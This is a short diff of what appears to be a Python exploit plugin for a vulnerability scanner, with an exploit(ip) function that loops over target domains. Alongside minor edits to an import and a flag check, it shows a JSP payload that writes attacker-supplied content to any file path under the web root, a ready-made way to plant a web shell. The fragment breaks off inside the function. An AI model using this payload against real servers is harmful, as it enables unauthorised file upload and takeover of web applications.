@@ -5,7 +5,7 @@ import sys
 import time
 import logging
 from lib.config import (
-    PASSWORD_DIC, TIME_OUT, MY_PROXY, USER_AGENT_LIST
+    PASSWORD_DIC, MY_PROXY, USER_AGENT_LIST
 )
 
 def get_plugin_info():
@@ -18,7 +18,7 @@ def get_plugin_info():
 
 def exploit(ip):
     result = []
-    if FindDomain_flag != 'n':
+    if FindDomain_flag:
         if Domain:
             for domain in Domain:
                     body = """<%  if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>"""
